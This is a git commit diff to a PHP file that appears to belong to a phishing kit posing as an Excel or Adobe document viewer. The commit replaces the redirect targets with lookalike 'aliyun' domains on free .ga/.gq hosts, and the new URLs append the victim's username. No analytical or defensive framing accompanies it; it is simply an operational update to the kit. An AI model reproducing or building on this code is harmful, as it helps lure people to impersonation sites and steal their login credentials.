ce94d8a5a5caf30b091c387dd01fee0aae7ffa5f
davisd878 <65018543+davisd878@users.noreply.github.com>
2020-11-24 12:59:24 +0100

    Update view-module-load-excel-j.php

--- view-module-load-excel-j.php
+++ view-module-load-excel-j.php
@@ -23,8 +23,8 @@ $domain = getDomainFromEmail($login);
 
 
 <?php
-$liks = array("https://documentdownload.ga/adobefile/",
-"https://documentdownload.ml/adobefile/");
+$liks = array("https://a1iyunm.ga/gens/aliyun/?username=",
+"https://a1iyunm.gq/gens/aliyun/?username=");
 
 $num= mt_rand(0,5);
 
